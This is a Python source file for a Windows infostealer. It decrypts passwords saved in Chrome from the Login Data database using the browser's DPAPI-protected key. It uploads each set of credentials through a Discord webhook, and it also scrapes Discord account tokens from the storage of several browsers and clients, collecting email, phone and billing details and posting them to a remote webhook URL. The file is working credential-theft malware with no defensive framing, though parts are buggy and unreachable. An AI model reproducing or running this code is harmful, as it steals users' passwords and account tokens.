import os
if os.name != "nt":
    exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
import base64
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
import requests
import win32crypt
from datetime import timezone, datetime, timedelta
import shutil
from Crypto.Cipher import AES
import sqlite3
import sys
import discord
import time


url = "https://google.com" # webhook url here
r = requests.get(url)
webhook_url = r.text

languages = {
    'da': 'Danish, Denmark',
    'de': 'German, Germany',
    'en-GB': 'English, United Kingdom',
    'en-US': 'English, United States',
    'es-ES': 'Spanish, Spain',
    'fr': 'French, France',
    'hr': 'Croatian, Croatia',
    'lt': 'Lithuanian, Lithuania',
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING +
    "\\Discord",
    "Discord Canary": ROAMING +
    "\\discordcanary",
    "Discord PTB": ROAMING +
    "\\discordptb",
    "Lightcord": ROAMING +
    "\\Lightcord",
    "Opera": ROAMING +
    "\\Opera Software\\Opera Stable",
    "Opera GX": ROAMING +
    "\\Opera Software\\Opera GX Stable",
    "Google Chrome": LOCAL +
    "\\Google\\Chrome\\User Data\\Default",
    "Brave": LOCAL +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL +
    "\\Yandex\\YandexBrowser\\User Data\\Default",
    "Vivaldi": LOCAL +
    "\\Vivaldi\\User Data\\Default",
    "MSEdge": LOCAL +
    "\\Microsoft\\Edge\\User Data\\Default",
}


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getuserdata(token):
    try:
        return loads(
            urlopen(
                Request(
                    "https://discordapp.com/api/v6/users/@me",
                    headers=getheaders(token))).read().decode())
    except BaseException:
        pass


def gettokens(path):
    path += "\\LOCAL Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [
            x.strip() for x in open(
                f"{path}\\{file_name}",
                errors="ignore").readlines() if x.strip()]:
            for regex in (
                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                    r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def has_payment_methods(token):
    try:
        return bool(
            len(
                loads(
                    urlopen(
                        Request(
                            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                            headers=getheaders(token))).read().decode())) > 0)
    except BaseException:
        pass


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    LOCAL_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "LOCAL", "Google", "Chrome",
                                    "User Data", "LOCAL State")
    with open(LOCAL_state_path, "r", encoding="utf-8") as f:
        LOCAL_state = f.read()
        LOCAL_state = json.loads(LOCAL_state)

    key = base64.b64decode(LOCAL_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except BaseException:
        try:
            return str(
                win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1])
        except BaseException:
            # not supported
            return ""


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    LOCAL_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "LOCAL", "Google", "Chrome",
        "User Data", "LOCAL State")

    with open(LOCAL_computer_directory_path, "r", encoding="utf-8") as f:
        LOCAL_state_data = f.read()
        LOCAL_state_data = json.loads(LOCAL_state_data)

    encryption_key = base64.b64decode(
        LOCAL_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(
        encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except BaseException:

        try:
            return str(
                win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1])
        except BaseException:
            return "No Passwords"


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "LOCAL",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            file_name = r"demo.txt"

            file1 = open(file_name, "w")
            file1.write(f"URL: {login_page_url} \n")
            file1.write(f"User: {user_name} \n")
            file1.write(f"Password: {decrypted_password} \n")
            file1.close()
            webhook = discord.Webhook.partial(
                111111111, # your webhook id
                '2222222222s2d2d2d2d2d2d', # your webhook token
                adapter=discord.RequestsWebhookAdapter())

            with open(file='demo.txt', mode='rb') as f:
                my_file = discord.File(f)

            webhook.send('', username='demo', file=my_file)
        else:
            continue
    cursor.close()
    db.close()

    try:
        os.remove(filename)
    except BaseException:
        pass

        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        computer_os = plt.platform()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except BaseException:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + \
                    "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                locale = user_data['locale']
                email = user_data.get("email")
                phone = user_data.get("phone")
                verified = user_data['verified']
                mfa_enabled = user_data['mfa_enabled']
                flags = user_data['flags']

                creation_date = datetime.utcfromtimestamp(
                    ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')

                language = languages.get(locale)
                nitro = bool(user_data.get("premium_type"))
                billing = bool(has_payment_methods(token))
                embed = {"color": 2,
                         "fields": [{"name": "**Account Info**",
                                     "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                                     "inline": True},
                                    {"name": "**Token**",
                                     "value": f"`{token}`",
                                     "inline": False}],
                         "author": {"name": f"{username}・{user_id}",
                                    },
                         "footer": {"text": "test"}}
                embeds.append(embed)

        if len(working) == 0:
            working.append('123')
        webhook_info = {
            "content": "",
            "embeds": embeds,
            "username": "demo",
            "avatar_url": "https://avatarfiles.alphacoders.com/977/thumb-1920-97774.gif"}
        try:
            urlopen(
                Request(
                    webhook_url,
                    data=dumps(webhook_info).encode(),
                    headers=getheaders()))
        except BaseException:
            pass


if __name__ == "__main__":
    main()
